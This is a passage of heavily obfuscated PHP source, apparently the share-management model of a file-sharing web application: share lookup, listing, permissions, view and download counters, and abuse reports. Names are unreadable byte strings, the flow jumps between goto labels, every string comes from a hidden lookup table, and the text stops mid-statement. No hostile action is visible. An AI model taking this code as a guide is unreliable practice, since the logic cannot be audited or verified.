public function getInfoByPath($c²Ç‚³Ô¯Ù) { $DÌ›ˆÚ´­¢ =& $_SERVER[œº]; $bõøÒ¥øºÌ = array($DÌ›ˆÚ´­¢[1528] => USER_ID, $DÌ›ˆÚ´­¢[395] => $c²Ç‚³Ô¯Ù); return $this->_getShareInfo($bõøÒ¥øºÌ); } public function getInfoBySourcePath($Eß©½îßµ‘) { $bÌöÚ¯‡Ì =& $_SERVER[œº]; $aÆ¿Ö¬ï“— = array($bÌöÚ¯‡Ì[1528] => USER_ID, $bÌöÚ¯‡Ì[1071] => $Eß©½îßµ‘); return $this->_getShareInfo($aÆ¿Ö¬ï“—); } private function _getShareInfo($d²¶íË¶‰•) { goto f¸ÔÒ”ù¨; Aå«§Ğ‹á·: if ($a·¥Õ¼´†¬[$B†—àš·¤[395]] == $B†—àš·¤[191]) { $a·¥Õ¼´†¬[$B†—àš·¤[85]] = IO::info($a·¥Õ¼´†¬[$B†—àš·¤[1071]]); } else { $a·¥Õ¼´†¬[$B†—àš·¤[85]] = Model($B†—àš·¤[1206])->pathInfo($a·¥Õ¼´†¬[$B†—àš·¤[395]]); } $a·¥Õ¼´†¬[$B†—àš·¤[1824]] = $bñÖÇ’š˜è; return $a·¥Õ¼´†¬; goto f‹ª¸²¯”²; f¸ÔÒ”ù¨: $B†—àš·¤ =& $_SERVER[œº]; $a·¥Õ¼´†¬ = $this->where($d²¶íË¶‰•)->find(); if (!$a·¥Õ¼´†¬) { return !1; } goto C’œ¡ÜŠÊ; C’œ¡ÜŠÊ: $d²¶íË¶‰• = array($B†—àš·¤[468] => $a·¥Õ¼´†¬[$B†—àš·¤[468]]); $aŠÃÌÉÊî· = $B†—àš·¤[1823]; $bñÖÇ’š˜è = Model($B†—àš·¤[564])->order($B†—àš·¤[393])->field($aŠÃÌÉÊî·)->where($d²¶íË¶‰•)->select(); goto Aå«§Ğ‹á·; f‹ª¸²¯”²: } protected function getInfoAuth($Cº‘‹–ôÖ†) { $a¸øš£ˆÚ =& $_SERVER[œº]; $Bëå§ÅÂğã = $this->getInfo($Cº‘‹–ôÖ†); $Bëå§ÅÂğã[$a¸øš£ˆÚ[406]] = Model($a¸øš£ˆÚ[482])->authMake($Bëå§ÅÂğã[$a¸øš£ˆÚ[1824]]); return $Bëå§ÅÂğã; } protected function listData($C¸í¸´ö‰Ù = null, $D­¿‰£®ß± = 300) { $d”¦Û£éÔà =& $_SERVER[œº]; $Dëİò©§ï = array(array($d”¦Û£éÔà[473] => array($d”¦Û£éÔà[969], 0), $d”¦Û£éÔà[475] => array($d”¦Û£éÔà[969], 0), $d”¦Û£éÔà[1825] => $d”¦Û£éÔà[1779])); if ($C¸í¸´ö‰Ù == $d”¦Û£éÔà[1826]) { $Dëİò©§ï = array($d”¦Û£éÔà[473] => 1); } else { if ($C¸í¸´ö‰Ù == $d”¦Û£éÔà[1056]) { $Dëİò©§ï = array($d”¦Û£éÔà[475] => 1); } } $Dëİò©§ï[$d”¦Û£éÔà[1528]] = USER_ID; $aÍÃå§‡ö‚ = $this->where($Dëİò©§ï)->selectPage($D­¿‰£®ß±); return $aÍÃå§‡ö‚; } protected function listToMe($e—ØÎöê°Û = 300) { goto f±Ö‰Ö˜ø¿; B¨„³¥¨í°: if ($eÀğªó†Ş¿) { $b‡‰©†È¬ = array(array($Cè¬†ÌñÛö[549] => SourceModel::TYPE_USER, $Cè¬†ÌñÛö[484] => USER_ID), array($Cè¬†ÌñÛö[549] => SourceModel::TYPE_GROUP, $Cè¬†ÌñÛö[484] => array($Cè¬†ÌñÛö[7], $eÀğªó†Ş¿)), $Cè¬†ÌñÛö[1825] => $Cè¬†ÌñÛö[1779]); } $c—‰Ç¢É¿… = Model($Cè¬†ÌñÛö[564])->where($b‡‰©†È¬)->selectPage($e—ØÎöê°Û); $eõ“Œï½µ = array_to_keyvalue_group($c—‰Ç¢É¿…[$Cè¬†ÌñÛö[367]], $Cè¬†ÌñÛö[468]); goto dÀ„·„›Œ‹; A®²è¸›ä: $d¡¨¤Ç¶Ã = $this->field($aØÊàå‘ğ»)->where($b‡‰©†È¬)->select(); foreach ($d¡¨¤Ç¶Ã as $FªâËÛÃÌ => &$AíöŠİ©æÇ) { $AíöŠİ©æÇ[$Cè¬†ÌñÛö[1824]] = $eõ“Œï½µ[$AíöŠİ©æÇ[$Cè¬†ÌñÛö[468]]]; } unset($AíöŠİ©æÇ); goto b±ÌÛ”ê¥; f±Ö‰Ö˜ø¿: $Cè¬†ÌñÛö =& $_SERVER[œº]; $eÀğªó†Ş¿ = Model($Cè¬†ÌñÛö[1827])->userGroupParents(USER_ID); $b‡‰©†È¬ = array($Cè¬†ÌñÛö[549] => SourceModel::TYPE_USER, $Cè¬†ÌñÛö[484] => USER_ID); goto B¨„³¥¨í°; dÀ„·„›Œ‹: if (!$eõ“Œï½µ) { return $c—‰Ç¢É¿…; } $aØÊàå‘ğ» = $Cè¬†ÌñÛö[1828]; $b‡‰©†È¬ = array($Cè¬†ÌñÛö[468] => array($Cè¬†ÌñÛö[411], array_keys($eõ“Œï½µ))); goto A®²è¸›ä; b±ÌÛ”ê¥: $eêÊ„æš¼à = array($Cè¬†ÌñÛö[1829] => $d¡¨¤Ç¶Ã, $Cè¬†ÌñÛö[1830] => $c—‰Ç¢É¿…[$Cè¬†ÌñÛö[364]]); return $eêÊ„æš¼à; goto F¤¿”øœñ; F¤¿”øœñ: } protected function shareAdd($C¾¨›­‘Æ, $A»èŠÜèà³) { $F…³Š…Ù²¬ =& $_SERVER[œº]; $e‘ä›’ìŞµ = $this->_addShareData($C¾¨›­‘Æ, $A»èŠÜèà³); if (!empty($A»èŠÜèà³[$F…³Š…Ù²¬[1831]])) { $this->_shareAuthSet($e‘ä›’ìŞµ, $A»èŠÜèà³[$F…³Š…Ù²¬[1831]]); } $this->shareEventAdd($C¾¨›­‘Æ, $A»èŠÜèà³, $F…³Š…Ù²¬[1059]); return $e‘ä›’ìŞµ; } private function shareEventAdd($c¹ã·øÍã’, $D¸…Êøíù—, $dÂÅÉÀ¥– = "\x61\144\144") { goto eóõ–˜Ê…—; eóõ–˜Ê…—: $DÂ‘Ìª¶Û =& $_SERVER[œº]; if (!$c¹ã·øÍã’ || $c¹ã·øÍã’ == $DÂ‘Ìª¶Û[191]) { return; } if ($dÂÅÉÀ¥– == $DÂ‘Ìª¶Û[1059]) { if ($D¸…Êøíù—[$DÂ‘Ìª¶Û[473]] == $DÂ‘Ìª¶Û[87]) { Model($DÂ‘Ìª¶Û[533])->eventShare($c¹ã·øÍã’, $DÂ‘Ìª¶Û[1832]); } if ($D¸…Êøíù—[$DÂ‘Ìª¶Û[475]] == $DÂ‘Ìª¶Û[87]) { Model($DÂ‘Ìª¶Û[533])->eventShare($c¹ã·øÍã’, $DÂ‘Ìª¶Û[1833]); } return; } goto Aˆæ§Ô÷„¹; DôÍ°ë¤Šâ: Model($DÂ‘Ìª¶Û[533])->eventShare($c¹ã·øÍã’, $dèÍ›Ù±); return; goto f’¾¸ˆ»²‹; D÷ŞïÜŠ£ô: if ($aô¬ƒ‘ñê±[$DÂ‘Ìª¶Û[473]] == $DÂ‘Ìª¶Û[87] && $D¸…Êøíù—[$DÂ‘Ìª¶Û[473]] == $DÂ‘Ìª¶Û[191]) { $dèÍ›Ù± = $DÂ‘Ìª¶Û[1835]; } if ($aô¬ƒ‘ñê±[$DÂ‘Ìª¶Û[475]] == $DÂ‘Ìª¶Û[191] && $D¸…Êøíù—[$DÂ‘Ìª¶Û[475]] == $DÂ‘Ìª¶Û[87]) { $dèÍ›Ù± = $DÂ‘Ìª¶Û[1833]; } if ($aô¬ƒ‘ñê±[$DÂ‘Ìª¶Û[475]] == $DÂ‘Ìª¶Û[87] && $D¸…Êøíù—[$DÂ‘Ìª¶Û[475]] == $DÂ‘Ìª¶Û[191]) { $dèÍ›Ù± = $DÂ‘Ìª¶Û[1836]; } goto DôÍ°ë¤Šâ; Aˆæ§Ô÷„¹: $aô¬ƒ‘ñê± = $this->getInfoByPath($c¹ã·øÍã’); $dèÍ›Ù± = $DÂ‘Ìª¶Û[1834]; if ($aô¬ƒ‘ñê±[$DÂ‘Ìª¶Û[473]] == $DÂ‘Ìª¶Û[191] && $D¸…Êøíù—[$DÂ‘Ìª¶Û[473]] == $DÂ‘Ìª¶Û[87]) { $dèÍ›Ù± = $DÂ‘Ìª¶Û[1832]; } goto D÷ŞïÜŠ£ô; f’¾¸ˆ»²‹: } private function _addShareData($b©™–éÎƒ®, $C²”Êœ£áô = array()) { goto BÄÁÚÊ¾õ; BÄÁÚÊ¾õ: $AµÌ«âã¬Í =& $_SERVER[œº]; $D×£Ûâ = array($AµÌ«âã¬Í[410] => $b©™–éÎƒ®, $AµÌ«âã¬Í[1520] => USER_ID); if ($b©™–éÎƒ® == 0) { $D×£Ûâ = array($AµÌ«âã¬Í[1837] => $C²”Êœ£áô[$AµÌ«âã¬Í[1071]], $AµÌ«âã¬Í[1520] => USER_ID); } goto dÖ‚ ‘ñ; b¼ï·¿„äÑ: $fëÏòğãß˜ = $this->add($Bòå¯äÑˆÔ); $dİÀ™„×Ãø = array($AµÌ«âã¬Í[470] => short_id($fëÏòğãß˜)); $this->where(array($AµÌ«âã¬Í[467] => $fëÏòğãß˜))->save($dİÀ™„×Ãø); goto f¬İ¯ØËâá; f¬İ¯ØËâá: return $fëÏòğãß˜; goto eƒ§¡äÓèÜ; dÖ‚ ‘ñ: if ($AÔŞÈÔÒº = $this->where($D×£Ûâ)->find()) { return $AÔŞÈÔÒº[$AµÌ«âã¬Í[468]]; } if ($b©™–éÎƒ® == 0) { $dŒÍã±Å¾¨ = array($AµÌ«âã¬Í[28] => get_path_this($C²”Êœ£áô[$AµÌ«âã¬Í[76]])); } else { $dŒÍã±Å¾¨ = Model($AµÌ«âã¬Í[790])->sourceInfo($b©™–éÎƒ®); if (!$dŒÍã±Å¾¨) { return !1; } } if (!$C²”Êœ£áô[$AµÌ«âã¬Í[1432]]) { $C²”Êœ£áô[$AµÌ«âã¬Í[1432]] = $dŒÍã±Å¾¨[$AµÌ«âã¬Í[28]]; } goto fàÌØè‰ë; fàÌØè‰ë: $Bòå¯äÑˆÔ = array($AµÌ«âã¬Í[1520] => USER_ID, $AµÌ«âã¬Í[410] => $b©™–éÎƒ®, $AµÌ«âã¬Í[1432] => $AµÌ«âã¬Í[33], $AµÌ«âã¬Í[473] => 0, $AµÌ«âã¬Í[475] => 0, $AµÌ«âã¬Í[1071] => $AµÌ«âã¬Í[33], $AµÌ«âã¬Í[305] => $AµÌ«âã¬Í[33], $AµÌ«âã¬Í[849] => $AµÌ«âã¬Í[33], $AµÌ«âã¬Í[1838] => 0, $AµÌ«âã¬Í[1839] => 0, $AµÌ«âã¬Í[476] => 0, $AµÌ«âã¬Í[477] => $AµÌ«âã¬Í[33], $AµÌ«âã¬Í[470] => $AµÌ«âã¬Í[33]); $Aİ…ÙõÇ²Ï = explode($AµÌ«âã¬Í[47], $AµÌ«âã¬Í[1840]); foreach ($Aİ…ÙõÇ²Ï as $fÁ´õÇ…Ó•) { if (!isset($C²”Êœ£áô[$fÁ´õÇ…Ó•])) { continue; } $Bòå¯äÑˆÔ[$fÁ´õÇ…Ó•] = $C²”Êœ£áô[$fÁ´õÇ…Ó•]; } goto b¼ï·¿„äÑ; eƒ§¡äÓèÜ: } private function _shareAuthSet($FŒ²—¥á£, $bÈõÍ°˜Õœ) { goto e¡š¯’‚Õ©; Cƒèôçˆ‰: $dÏ¡º¤»òç->where(array($A¶±İ–Äğ¤[468] => $FŒ²—¥á£))->delete(); $A¾§§óëÕ‹ = array(); foreach ($bÈõÍ°˜Õœ as $FëÜåã) { $EÒËÎƒÉÅ = SourceModel::TYPE_USER; if ($FëÜåã[$A¶±İ–Äğ¤[404]] == SourceModel::TYPE_GROUP) { $EÒËÎƒÉÅ = SourceModel::TYPE_GROUP; } $d‹Ë¬ï³Ğ = array($A¶±İ–Äğ¤[468] => $FŒ²—¥á£, $A¶±İ–Äğ¤[404] => $EÒËÎƒÉÅ, $A¶±İ–Äğ¤[484] => intval($FëÜåã[$A¶±İ–Äğ¤[484]]), $A¶±İ–Äğ¤[1787] => 0, $A¶±İ–Äğ¤[1841] => -1); if ($FëÜåã[$A¶±İ–Äğ¤[1787]]) { $d‹Ë¬ï³Ğ[$A¶±İ–Äğ¤[1787]] = $FëÜåã[$A¶±İ–Äğ¤[1787]]; } else { if ($FëÜåã[$A¶±İ–Äğ¤[1841]]) { $d‹Ë¬ï³Ğ[$A¶±İ–Äğ¤[1841]] = $FëÜåã[$A¶±İ–Äğ¤[1841]]; } } $A¾§§óëÕ‹[] = $d‹Ë¬ï³Ğ; } goto eÜåÙÂè¸; eÜåÙÂè¸: return $dÏ¡º¤»òç->addAll($A¾§§óëÕ‹, array(), !0); goto EÇœ—¥‘Í; e¡š¯’‚Õ©: $A¶±İ–Äğ¤ =& $_SERVER[œº]; if (!is_array($bÈõÍ°˜Õœ)) { return !1; } $dÏ¡º¤»òç = Model($A¶±İ–Äğ¤[1791]); goto Cƒèôçˆ‰; EÇœ—¥‘Í: } public function numViewAdd($A‚‘Ç‚Á»Î) { $aôé×šê¸ =& $_SERVER[œº]; $aÙßß»¶‚« = array($aôé×šê¸[467] => $A‚‘Ç‚Á»Î); $this->where($aÙßß»¶‚«)->setAdd($aôé×šê¸[1838]); } public function numDownloadAdd($Aº¬Ğ××ò) { $b‹¿§ŒÁƒ =& $_SERVER[œº]; $b÷Å¸Ş®Ê = array($b‹¿§ŒÁƒ[467] => $Aº¬Ğ××ò); $this->where($b÷Å¸Ş®Ê)->setAdd($b‹¿§ŒÁƒ[1839]); } protected function shareEdit($B‘…Îê÷ì·, $d­±´­²ŠÑ) { goto aƒßïàÖëÍ; aƒßïàÖëÍ: $DèàƒöŸ‘ì =& $_SERVER[œº]; $b¥†Œà©ˆ„ = $this->getInfo($B‘…Îê÷ì·); if (!$b¥†Œà©ˆ„) { return !1; } goto c‚Ñ£ºŠÈ¼; BçÍ·±Ñî: foreach ($Cƒ¨«¬‡Õä as $d°ÇÜ¡ã¯·) { if (!array_key_exists($d°ÇÜ¡ã¯·, $d­±´­²ŠÑ)) { continue; } $aÑîµîáƒâ[$d°ÇÜ¡ã¯·] = $d­±´­²ŠÑ[$d°ÇÜ¡ã¯·]; } $this->shareEventAdd($b¥†Œà©ˆ„[$DèàƒöŸ‘ì[395]], $d­±´­²ŠÑ, $DèàƒöŸ‘ì[1659]); $this->where(array($DèàƒöŸ‘ì[467] => $B‘…Îê÷ì·))->save($aÑîµîáƒâ); goto d¹¶¼·ö¢Ç; c‚Ñ£ºŠÈ¼: $this->_checkLinkShare($d­±´­²ŠÑ, $b¥†Œà©ˆ„); $aÑîµîáƒâ = array(); $Cƒ¨«¬‡Õä = explode($DèàƒöŸ‘ì[47], $DèàƒöŸ‘ì[1842]); goto BçÍ·±Ñî; d¹¶¼·ö¢Ç: if (isset($d­±´­²ŠÑ[$DèàƒöŸ‘ì[1831]])) { $this->_shareAuthSet($B‘…Îê÷ì·, $d­±´­²ŠÑ[$DèàƒöŸ‘ì[1831]]); } return !0; goto E®ã‡…Í­Ö; E®ã‡…Í­Ö: } private function _checkLinkShare($c™ñ©Åáé, $b©Â÷¸ù³) { goto FóÊ¿¼Ã¼Ú; FóÊ¿¼Ã¼Ú: $F‘Â¡¡¸È =& $_SERVER[œº]; if ($c™ñ©Åáé[$F‘Â¡¡¸È[473]] != $F‘Â¡¡¸È[87]) { return; } $Fœ±†™˜ïÀ = $b©Â÷¸ù³[$F‘Â¡¡¸È[85]][$F‘Â¡¡¸È[395]]; goto BáÜé‚“ÒÂ; BáÜé‚“ÒÂ: if ($b©Â÷¸ù³[$F‘Â¡¡¸È[85]][$F‘Â¡¡¸È[29]] != $F‘Â¡¡¸È[193]) { $C’À‡ø·„Ö = $this->_folderReport($Fœ±†™˜ïÀ); if (!$C’À‡ø·„Ö) { return; } show_json(LNG($F‘Â¡¡¸È[1843]) . $F‘Â¡¡¸È[1844] . $C’À‡ø·„Ö, !1); } $F‘Ì©¢„ìã = Model($F‘Â¡¡¸È[790])->fileInfoGet($b©Â÷¸ù³[$F‘Â¡¡¸È[85]][$F‘Â¡¡¸È[395]]); if (!$F‘Ì©¢„ìã) { return; } goto e¥§ÒÀ‰ßğ; e¥§ÒÀ‰ßğ: $e‡öôæÇ‰Ë = $this->shareFileMeta($F‘Ì©¢„ìã[$F‘Â¡¡¸È[447]]); if (isset($e‡öôæÇ‰Ë[$F‘Â¡¡¸È[372]]) && $e‡öôæÇ‰Ë[$F‘Â¡¡¸È[372]] == $F‘Â¡¡¸È[87]) { show_json(LNG($F‘Â¡¡¸È[1845]), !1); } goto C‘Ì­¸İô‹; C‘Ì­¸İô‹: } private function _folderReport($b¾¤¨§øÑ) { goto c‘°‹µÒƒö; DƒÍÊÀ¹º: $BœÕ˜¿†« = substr($fé³èøÌ£ï[$dä‰‘à„­°[487]], strpos($fé³èøÌ£ï[$dä‰‘à„­°[487]], $f‡§ÌÊÄÛÑ)); $C°Üœ×¼í = array($dä‰‘à„­°[395] => array($dä‰‘à„­°[7], trim($BœÕ˜¿†«, $dä‰‘à„­°[47]))); $E¡ï Ö‘ĞÚ = Model($dä‰‘à„­°[790])->where($C°Üœ×¼í)->field($dä‰‘à„­°[28])->select(); goto c³·†ğß¢Ï; aù•ä›¦Ç‚: $C°Üœ×¼í = array($dä‰‘à„­°[447] => array($dä‰‘à„­°[7], $e½ÓÀÎ’Å•), $dä‰‘à„­°[487] => array($dä‰‘à„­°[380], "\45{$f‡§ÌÊÄÛÑ}\x25"), $dä‰‘à„­°[423] => 0); $fé³èøÌ£ï = Model($dä‰‘à„­°[790])->where($C°Üœ×¼í)->field($dä‰‘à„­°[1847])->find(); if (!$fé³èøÌ£ï) { return !1; } goto DƒÍÊÀ¹º; c‘°‹µÒƒö: $dä‰‘à„­° =& $_SERVER[œº]; $C°Üœ×¼í = array($dä‰‘à„­°[447] => array($dä‰‘à„­°[969], 0), $dä‰‘à„­°[710] => 3); $e½ÓÀÎ’Å• = Model($dä‰‘à„­°[1846])->where($C°Üœ×¼í)->field($dä‰‘à„­°[447])->select(); goto BİÀßØš«; BİÀßØš«: if (!$e½ÓÀÎ’Å•) { return !1; } $e½ÓÀÎ’Å• = array_to_keyvalue($e½ÓÀÎ’Å•, $dä‰‘à„­°[33], $dä‰‘à„­°[447]); $f‡§ÌÊÄÛÑ = $dä‰‘à„­°[47] . $b¾¤¨§øÑ . $dä‰‘à„­°[47]; goto aù•ä›¦Ç‚; c³·†ğß¢Ï: $EÃ¶¡¥ÎÁÇ = array_to_keyvalue($E¡ï Ö‘ĞÚ, $dä‰‘à„­°[33], $dä‰‘à„­°[28]); $EÃ¶¡¥ÎÁÇ[] = $fé³èøÌ£ï[$dä‰‘à„­°[28]]; return implode($dä‰‘à„­°[8], $EÃ¶¡¥ÎÁÇ); goto D½İİæœâ¸; D½İİæœâ¸: } protected function remove($c‡âÜšâ§á) { goto d³ø÷·ÁÂ¬; d³ø÷·ÁÂ¬: $dÊ¯¦ñèÉ =& $_SERVER[œº]; if (is_array($c‡âÜšâ§á)) { $c‡âÜšâ§á = array($dÊ¯¦ñèÉ[7], $c‡âÜšâ§á); } $Côê÷›Ô¦° = array($dÊ¯¦ñèÉ[468] => $c‡âÜšâ§á); goto d´÷ÇåÀÁ; d´÷ÇåÀÁ: $cñŠÉø‰‡ = $this->where($Côê÷›Ô¦°)->delete(); if ($cñŠÉø‰‡) { Model($dÊ¯¦ñèÉ[564])->where(array($dÊ¯¦ñèÉ[468] => $c‡âÜšâ§á))->delete(); } $bù˜ˆ•½×ß = is_array($c‡âÜšâ§á) ? $c‡âÜšâ§á[1] : array($c‡âÜšâ§á); goto fÊğÈ£ç«; fÊğÈ£ç«: for ($f¬ĞØ–‚Äõ = 0; $f¬ĞØ–‚Äõ < count($bù˜ˆ•½×ß); $f¬ĞØ–‚Äõ++) { $EÎÁƒ´ã = $this->getInfo($bù˜ˆ•½×ß[$f¬ĞØ–‚Äõ]); if ($EÎÁƒ´ã[$dÊ¯¦ñèÉ[475]] == $dÊ¯¦ñèÉ[87]) { Model($dÊ¯¦ñèÉ[533])->eventShare($EÎÁƒ´ã[$dÊ¯¦ñèÉ[395]], $dÊ¯¦ñèÉ[1836]); } if ($EÎÁƒ´ã[$dÊ¯¦ñèÉ[473]] == $dÊ¯¦ñèÉ[87]) { Model($dÊ¯¦ñèÉ[533])->eventShare($EÎÁƒ´ã[$dÊ¯¦ñèÉ[395]], $dÊ¯¦ñèÉ[1835]); } } return $cñŠÉø‰‡; goto DÜÈ§„Š™ ; DÜÈ§„Š™ : } protected function removeBySource($fÁ©øÌ¶šø) { goto Bá­ŸˆŠ—Ö; Bá­ŸˆŠ—Ö: $a±Øœê„• =& $_SERVER[œº]; $c¬µ–ªï = array($a±Øœê„•[410] => array($a±Øœê„•[411], $fÁ©øÌ¶šø)); $Fç®Õ«ø” = $this->field($a±Øœê„•[468])->where($c¬µ–ªï)->select(); goto c”Áá¢‘ÓÅ; c”Áá¢‘ÓÅ: $Fç®Õ«ø” = array_to_keyvalue($Fç®Õ«ø”, $a±Øœê„•[33], $a±Øœê„•[468]); if (!$Fç®Õ«ø”) { return; } $c¬µ–ªï = array($a±Øœê„•[467] => array($a±Øœê„•[411], $Fç®Õ«ø”)); goto DÖ›òŠòÌØ; DÖ›òŠòÌØ: $this->where($c¬µ–ªï)->delete(); Model($a±Øœê„•[564])->where($c¬µ–ªï)->delete(); goto Aê‰½ìµŞƒ; Aê‰½ìµŞƒ: } public function listAll($fáœ¬‚º) { goto dğù†½Ç³ï; eÙìö‰âÜÏ: $E‹ÒËŒå = $this->_makeOrder()->where($D‚•É¿­®Ğ)->selectPage(20); if (empty($E‹ÒËŒå[$D‚»Ñ¸ò•¹[367]])) { return array(); } $this->_listDataApply($E‹ÒËŒå[$D‚»Ñ¸ò•¹[367]]); goto e¥½šê»Ğ¸; EÃÍà£à•: if ($fáœ¬‚º[$D‚»Ñ¸ò•¹[721]]) { $f†¸„¹„Ÿç = $fáœ¬‚º[$D‚»Ñ¸ò•¹[476]] ? $fáœ¬‚º[$D‚»Ñ¸ò•¹[476]] : strtotime(date($D‚»Ñ¸ò•¹[1848])); $D‚•É¿­®Ğ[$D‚»Ñ¸ò•¹[194]] = array($D‚»Ñ¸ò•¹[331], array($fáœ¬‚º[$D‚»Ñ¸ò•¹[721]], $f†¸„¹„Ÿç)); } if ($fáœ¬‚º[$D‚»Ñ¸ò•¹[29]]) { $D‚•É¿­®Ğ[$fáœ¬‚º[$D‚»Ñ¸ò•¹[29]]] = 1; } else { $D‚•É¿­®Ğ[] = array($D‚»Ñ¸ò•¹[473] => array($D‚»Ñ¸ò•¹[969], 0), $D‚»Ñ¸ò•¹[475] => array($D‚»Ñ¸ò•¹[969], 0), $D‚»Ñ¸ò•¹[1825] => $D‚»Ñ¸ò•¹[1779]); } if ($fáœ¬‚º[$D‚»Ñ¸ò•¹[1775]]) { $D‚•É¿­®Ğ[] = array($D‚»Ñ¸ò•¹[470] => $fáœ¬‚º[$D‚»Ñ¸ò•¹[1775]], $D‚»Ñ¸ò•¹[1432] => array($D‚»Ñ¸ò•¹[380], "\45{$fáœ¬‚º[$D‚»Ñ¸ò•¹[1775]]}\45"), $D‚»Ñ¸ò•¹[1825] => $D‚»Ñ¸ò•¹[1779]); } goto eÙìö‰âÜÏ; e¥½šê»Ğ¸: return $E‹ÒËŒå; goto Fãàğìâ‘; dğù†½Ç³ï: $D‚»Ñ¸ò•¹ =& $_SERVER[œº]; $D‚•É¿­®Ğ = array(); if ($fáœ¬‚º[$D‚»Ñ¸ò•¹[1528]]) { $D‚•É¿­®Ğ[$D‚»Ñ¸ò•¹[1528]] = $fáœ¬‚º[$D‚»Ñ¸ò•¹[1528]]; } goto EÃÍà£à•; Fãàğìâ‘: } public function listDataApply($Bà§…Œƒ†Ô) { $this->_listDataApply($Bà§…Œƒ†Ô); return $Bà§…Œƒ†Ô; } private function _listDataApply(&$díñÂäï§) { goto Dœ…¸×¬Í™; e¸ƒá¼ï¢–: unset($AêÀÚ°½Âø); $díñÂäï§ = array_values($díñÂäï§); goto C£Ÿ›ƒÔ•; eİ¶„šÏè: $D××ƒ¥“Œ = array_to_keyvalue($díñÂäï§, $A‘¼†ÇØï[33], $A‘¼†ÇØï[395]); $a˜ìËé„… = Model($A‘¼†ÇØï[790])->sourceListInfo($D××ƒ¥“Œ, !0); foreach ($díñÂäï§ as $cƒÇ•‰Î => &$AêÀÚ°½Âø) { $C¥±ô‚—¢¬ = $AêÀÚ°½Âø[$A‘¼†ÇØï[1528]]; $AêÀÚ°½Âø[$A‘¼†ÇØï[1849]] = $dè‹Ä¹´“[$C¥±ô‚—¢¬] ? $dè‹Ä¹´“[$C¥±ô‚—¢¬] : !1; $CäÆÂì‹ğ = $AêÀÚ°½Âø[$A‘¼†ÇØï[395]]; $AêÀÚ°½Âø[$A‘¼†ÇØï[85]] = $a˜ìËé„…[$CäÆÂì‹ğ] ? $a˜ìËé„…[$CäÆÂì‹ğ] : !1; if ($AêÀÚ°½Âø[$A‘¼†ÇØï[85]][$A‘¼†ÇØï[423]] == $A‘¼†ÇØï[87]) { unset($díñÂäï§[$cƒÇ•‰Î]); } if ($AêÀÚ°½Âø[$A‘¼†ÇØï[85]] != $A‘¼†ÇØï[191] && !$AêÀÚ°½Âø[$A‘¼†ÇØï[85]]) { unset($díñÂäï§[$cƒÇ•‰Î]); } } goto e¸ƒá¼ï¢–; Dœ…¸×¬Í™: $A‘¼†ÇØï =& $_SERVER[œº]; $AÎøÖ±åÀ‹ = array_to_keyvalue($díñÂäï§, $A‘¼†ÇØï[33], $A‘¼†ÇØï[1528]); $dè‹Ä¹´“ = Model($A‘¼†ÇØï[506])->userListInfo(array_unique($AÎøÖ±åÀ‹)); goto eİ¶„šÏè; C£Ÿ›ƒÔ•: } private function _makeOrder($d¶¬¢‹°è = '') { goto e²‚çªÀìœ; e²‚çªÀìœ: $FÒ¬ï‹œà =& $_SERVER[œº]; $b‘¹©­‡…ß = array($FÒ¬ï‹œà[194], $FÒ¬ï‹œà[476], $FÒ¬ï‹œà[1838], $FÒ¬ï‹œà[1839]); $aØÖ÷ÒÃ¹Ê = array($FÒ¬ï‹œà[428] => $FÒ¬ï‹œà[429], $FÒ¬ï‹œà[430] => $FÒ¬ï‹œà[431]); goto E»Ğö©’äÂ; E»Ğö©’äÂ: $d˜ÒõáÂ„‡ = Input::get($FÒ¬ï‹œà[435], $FÒ¬ï‹œà[7], $FÒ¬ï‹œà[416], $b‘¹©­‡…ß); $F•ŞÍ“è‰ = Input::get($FÒ¬ï‹œà[436], $FÒ¬ï‹œà[7], $FÒ¬ï‹œà[1850], array($FÒ¬ï‹œà[1774], $FÒ¬ï‹œà[430])); $F•ŞÍ“è‰ = $aØÖ÷ÒÃ¹Ê[$F•ŞÍ“è‰]; goto e•Äğ÷æòË; e•Äğ÷æòË: $d¶¬¢‹°è = $d¶¬¢‹°è . "{$d˜ÒõáÂ„‡}\40{$F•ŞÍ“è‰}"; return $this->order($d¶¬¢‹°è); goto e˜Ìôî­áª; e˜Ìôî­áª: } public function reportAdd($bÁ²…¯‚ƒ®) { $aö¤Îâ·Ìø =& $_SERVER[œº]; $eÂËÄã½±‘ = array($aö¤Îâ·Ìø[468] => $bÁ²…¯‚ƒ®[$aö¤Îâ·Ìø[468]], $aö¤Îâ·Ìø[1528] => USER_ID); if (Model($aö¤Îâ·Ìø[1846])->where($eÂËÄã½±‘)->find()) { return !1; } $dÔ¨¢³–› = array($aö¤Îâ·Ìø[468] => $bÁ²…¯‚ƒ®[$aö¤Îâ·Ìø[468]], $aö¤Îâ·Ìø[1432] => $bÁ²…¯‚ƒ®[$aö¤Îâ·Ìø[1432]], $aö¤Îâ·Ìø[395] => $bÁ²…¯‚ƒ®[$aö¤Îâ·Ìø[395]], $aö¤Îâ·Ìø[447] => $bÁ²…¯‚ƒ®[$aö¤Îâ·Ìø[447]], $aö¤Îâ·Ìø[1528] => USER_ID, $aö¤Îâ·Ìø[29] => $bÁ²…¯‚ƒ®[$aö¤Îâ·Ìø[29]], $aö¤Îâ·Ìø[431] => $bÁ²…¯‚ƒ®[$aö¤Îâ·Ìø[431]]); return Model($aö¤Îâ·Ìø[1846])->add($dÔ¨¢³–›); } public function reportList($fÄ¥é„…ğ) { goto cô‹¶­Äé¤; cô‹¶­Äé¤: $dÓñìØË¼Ğ =& $_SERVER[œº]; $bß“ÎéÒïš = array(); if ($fÄ¥é„…ğ[$dÓñìØË¼Ğ[721]]) { $fŒ—Õ‰Ûˆ = $fÄ¥é„…ğ[$dÓñìØË¼Ğ[476]] ? $fÄ¥é„…ğ[$dÓñìØË¼Ğ[476]] : strtotime(date($dÓñìØË¼Ğ[1848])); $bß“ÎéÒïš[$dÓñìØË¼Ğ[194]] = array($dÓñìØË¼Ğ[331], array($fÄ¥é„…ğ[$dÓñìØË¼Ğ[721]], $fŒ—Õ‰Ûˆ)); } goto F¥ Õ˜—; Få‘Ü†ì©À: if (empty($a°É†ˆ¥£†[$dÓñìØË¼Ğ[367]])) { return array(); } $b—êÒ…¼Æ = array_to_keyvalue_group($a°É†ˆ¥£†[$dÓñìØË¼Ğ[367]], $dÓñìØË¼Ğ[710], $dÓñìØË¼Ğ[468]); if (!empty($b—êÒ…¼Æ[0])) { $fÄ¥é„…ğ = $b—êÒ…¼Æ[0]; $bß“ÎéÒïš = array($dÓñìØË¼Ğ[468] => array($dÓñìØË¼Ğ[7], $fÄ¥é„…ğ)); $F‹ùéä·ƒ = 